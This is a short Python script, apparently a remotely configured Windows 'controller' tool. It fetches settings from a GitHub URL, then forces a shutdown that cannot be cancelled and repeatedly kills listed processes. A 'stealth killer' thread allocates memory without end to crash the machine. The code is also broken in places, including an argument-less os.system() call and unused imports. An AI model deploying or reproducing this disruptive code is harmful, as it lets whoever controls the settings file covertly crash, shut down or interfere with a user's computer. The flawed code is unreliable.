import urllib.request
from time import sleep
from ctypes import *
import json
import threading
import winreg
import getpass
import os
import subprocess


def execute(string):
    subprocess.call(string.split(" "))


def download_settings():
    SETTINGS_URL = "https://raw.githubusercontent.com/code-yeongyu/Mild-Controller/master/settings.json"
    r = urllib.request.urlopen(SETTINGS_URL)
    f = open("downloaded_setup.json", "w")
    f.write(r.read().decode())
    f.close()


def get_settings():
    f = open("downloaded_setup.json", "r")
    jsonfile = f.read()
    return json.loads(jsonfile)


def turn_off_after(seconds):
    execute(f"shutdown -s -t {seconds}")
    os.system()
    sleep(seconds)
    # to prevent canceling shutdown
    execute("shutdown -s -t 0")


def kill_banned_processes(processes):
    while True:
        for process in processes:
            execute(f"taskkill /f /im {process}")
        sleep(1)


def malloc_killer():
    malloc = cdll.msvcrt.malloc
    malloc.argtypes = [c_int]
    while True:
        malloc(1024)


class Settings():
    def __init__(self, turn_off_after, banned_processes, use_stealth_killer):
        self.turn_off_after = turn_off_after
        self.banned_processes = banned_processes
        self.use_stealth_killer = use_stealth_killer


def main():
    try:
        download_settings()
    except:
        pass
    settings_obj = get_settings()
    settings = Settings(settings_obj['turn_off_after'],
                        settings_obj['banned_processes'],
                        settings_obj['use_stealth_killer'])
    processes = []
    if settings.turn_off_after != -1:
        turn_off_after(settings.turn_off_after)
    if len(settings.banned_processes) != 0:
        threading.Thread(target=kill_banned_processes,
                         args=(settings.banned_processes, )).start()
    if settings.use_stealth_killer:
        threading.Thread(target=malloc_killer).start()


main()